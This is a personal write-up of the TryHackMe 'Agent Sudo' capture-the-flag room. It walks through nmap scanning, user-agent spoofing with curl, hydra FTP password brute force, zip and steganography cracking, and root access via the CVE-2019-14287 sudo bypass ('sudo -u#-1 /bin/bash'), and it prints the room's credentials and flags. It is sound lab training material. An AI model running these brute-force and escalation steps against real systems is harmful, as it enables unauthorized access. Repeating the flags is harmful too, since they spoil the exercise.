---
title: "[CTF] Tryhackme - Agent Sudo "
date: 2024-09-19 12:00:00 -500 
categories: [CTF - Tryhackme, Agent Sudo]
tags: [ctf,exploit,flags,tryhackme,pentesting]
author: Christoph K
---
[TryHackMe- Agent Sudo ](https://tryhackme.com/r/room/agentsudoctf)

## Tasks

- Enumerate
    - How many open ports?
    - How you redirect yourself to a secret page?
    - What is the agent name?
- Hash cracking and brute-force
    - FTP password
    - Zip file password
    - steg password
    - Who is the other agent (in full name)?
    - SSH password
- Capture the user flag
    - What is the user flag?
    - What is the incident of the photo called?
- Privilege escalation
    - CVE number for the escalation 
    - What is the root flag?
    - (Bonus) Who is Agent R?



## Enumerate

### How many open ports?

Again like in the other CTFs, `nmap` is our best friend for checking open ports. 

```bash

└─$ nmap -sV $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 16:06 CST
Nmap scan report for 10.10.124.15
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.16 seconds
```

We have `3` open ports.

Answer: `3` 


### How you redirect yourself to a secret page?

Lets check the website:

``` html
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
```

So we have to find out a `codename`. But we already the answer for this question:

Answer: `user-agent`

### What is the agent name?

Normally I would go with `gobuster` but my normal wordlist is probably not helping and I dont want to check millions of possible directories into that page. We can also `spoof` with `curl` for `forwardings`.


```bash
└─$ curl --help
Usage: curl [options...] <url>
 -d, --data <data>           HTTP POST data
 -f, --fail                  Fail fast with no output on HTTP errors
 -h, --help <category>       Get help for commands
 -i, --include               Include response headers in output
 -o, --output <file>         Write to file instead of stdout
 -O, --remote-name           Write output to file named as remote file
 -s, --silent                Silent mode
 -T, --upload-file <file>    Transfer local FILE to destination
 -u, --user <user:password>  Server user and password
 -A, --user-agent <name>     Send User-Agent <name> to server
 -v, --verbose               Make the operation more talkative
 -V, --version               Show version number and quit

```




We use `curl -A "R" -L $ip:

- `-A` means `Send User-Agent "Name" to server 
- `"R"` is our agent "R"
- `-L` (location) takes also redirects


```html
└─$ curl -A "R" -L $ip
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
```
Okay lets try to automate that, we write an easy `bash script`.


```bash
#!/bin/bash

ip="10.10.124.15"

for i in {A..C}
do 
    echo "Testing with letter: $i" >> results.txt
    curl -A "$i" -L $ip >> results.txt
    echo -e "\n" >> results.txt  
done

```
In our `results.txt` I found out, that the letter seems to be `c` for `chris`.


```
----------

Testing with letter: C
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
```

Answer: `chris`

## Hash cracking and brute-force

### FTP password

We use `hydra` for `bruteforce` the service ftp. We have already an user `chris`.

```bash

┌──(admin㉿PREDATOR-01)-[/usr/share/wordlists]
└─$ hydra -l chris -P rockyou.txt ftp://$ip
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-21 16:43:48
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.124.15:21/
[21][ftp] host: 10.10.124.15   login: chris   password: crystal
[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 13 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-21 16:44:53

┌──(admin㉿PREDATOR-01)-[/usr/share/wordlists]

```

Very good, password is `crystal`.

Answer: `crystal`

### Zip file password

We connect via `ftp` to the server with `chris credentials`.
There are some files there, which we download:
```bash

ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||47851|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |**************************************************************************************************************************************|   217       28.98 KiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (0.92 KiB/s)
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
229 Entering Extended Passive Mode (|||21893|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |**************************************************************************************************************************************| 33143       69.64 KiB/s    00:00 ETAg
et226 Transfer complete.
33143 bytes received in 00:00 (47.10 KiB/s)
 ftp> get cuti.png
local: cutie.png remote: cutie.png
229 Entering Extended Passive Mode (|||5442|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |**************************************************************************************************************************************| 34842       68.91 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (45.06 KiB/s)

```

Lets open the text file:

```bash
└─$ cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Okay for that we use `binwalk`.

    binwalk - tool for searching binary images for embedded files and executable code
    SYNOPSIS
       binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...


Lets check our pictures:

```bash
└─$ binwalk cute-alien.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
└─$ binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```

Alright we have an  zip file in that picture. Lets extract the zip file from the picture with the flag `-e`


Lets see if we extract the zip file via `7z`. I recommend `7z` because `unzip` bugged hard in my evironment. The zip file needs a password which we dont have (yet). 

```shell
└─$ 7z e 8702.zip

7-Zip 24.07 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19
 64-bit locale=en_US.UTF-8 Threads:24 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280


Enter password (will not be echoed):

```

Lets crack the password of that `zip` file via `john`. First we have to bring the file into the correct format for `john` with `zip2john`. 

```bash

┌──(admin㉿PREDATOR-01)-[~/agent_sudo/_cutie.png.extracted]
└─$ zip2john 8702.zip > 8702.hash

┌──(admin㉿PREDATOR-01)-[~/agent_sudo/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.hash  8702.zip  To_agentR.txt

┌──(admin㉿PREDATOR-01)-[~/agent_sudo/_cutie.png.extracted]
└─$ head 8702.hash
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
```

Now we can use `john` for cracking it.

```bash
└─$ john 8702.hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 24 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE 2/3 (2024-09-21 17:09) 2.702g/s 233070p/s 233070c/s 233070C/s 123456..ship4
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Nice, we got the password.

Answer: `alien`



```bash

└─$ cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

### steg password

In the last txt file we found `QXJlYTUx` which could be in Base64 or similar. With `CyberChef`we can try many formats. 

And yes, it was `base64` encoded, so we get `Area51`... Could be a password.

https://gchq.github.io/CyberChef/



Lets see if the other picture hides something. We can use `steghide` to check that. 

```bash
┌──(admin㉿PREDATOR-01)-[~/agent_sudo]
└─$ steghide --info cute-alien.jpg
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes

```

And yes, I could enter `Area51` and found that embedded file. Lets extract it from the picture.


```bash
┌──(admin㉿PREDATOR-01)-[~/agent_sudo]
└─$ steghide extract -sf cute-alien.jpg
Enter passphrase:
wrote extracted data to "message.txt".

┌──(admin㉿PREDATOR-01)-[~/agent_sudo]
└─$ ls
cute-alien.jpg  cutie.png  _cutie.png.extracted  message.txt  To_agentJ.txt

┌──(admin㉿PREDATOR-01)-[~/agent_sudo]
└─$ cat message.txt
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

```

Alright, we got a lot here.

Answer: `Area51`

### Who is the other agent (in full name)?

We found that out in the message.txt.

Answer: `james`


### SSH password

Lets try our new credentials from `james`.

```bash

└─$ ssh james@$ip -p 22
The authenticity of host '10.10.124.15 (10.10.124.15)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.124.15' (ED25519) to the list of known hosts.
james@10.10.124.15's password:
Permission denied, please try again.
james@10.10.124.15's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Sep 21 09:29:08 UTC 2024

  System load:  0.0               Processes:           98
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 17%               IP address for eth0: 10.10.124.15
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$
```

And we can login in `SSH`. 

Answer: `hackerrules!`


## Capture the user flag

###  What is the user flag?

In our `ssh` session with james:

```bash
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
james@agent-sudo:~$
```

### What is the incident of the photo called?


We can download the file via `scp`:

`scp james@$ip:Alien_autospy.jpg ~/Downloads`

And use google reverse picture search ( Google Lens) 


Answer: `Roswell Alien Autopsy`

## Privilege escalation



###  CVE number for the escalation 


Difficult one, I used `linepeas.sh` which check all server vulnerabilities and is very useful if you are not sure, which vector you want to use. I also checked if `james` is allowed to do anything in an elevated shell, which is not the case.

[Linepeas.sh, Github](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)


We can upload the script via `scp SOURCE TARGET:DIRECTORY`

```bash

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-55-generic (buildd@lcy01-amd64-029) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.3 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.21p2

```

The `sudo version` is vulnerable. Lets do some research here.

After some research I found this:

[CVE-2019-14287](https://www.cybersecurity-help.cz/vdb/SB2019101501)

Anser: `CVE-2019-14287`

I used this command from here https://www.exploit-db.com/exploits/47502:

`sudo -u#-1 /bin/bash`

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
[sudo] password for james:
root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:/root#

```

Answer: `b53a02f55b57d4439e3341834d70c062`

### (Bonus) Who is Agent R?


We found him already in the text file. 

`DesKel a.k.a Agent R`

Answer: `DesKel`





## Thoughts:
I like this CTF really much but it costs a lot of time. I think the task with the `CVE` was not clear, there are many possibilities for getting an elevated shell. But very interesting and we used a lot of tools! 

What did we learn?
- using `nmap` for scan open ports and versions
- using `ftp` for browsing in files.
- using `hydra` to bruteforce
- using `curl` to spoof `user-agents`
- we created a script which automated our `curl spoofing`
- using `binwalk` to find embedded files in images
- using `zip2john` and `john` for cracking a zip file
- using `steghide` find hidden data in image and audio files
- using `linepeas.sh` for finding potential vulnerabilities 


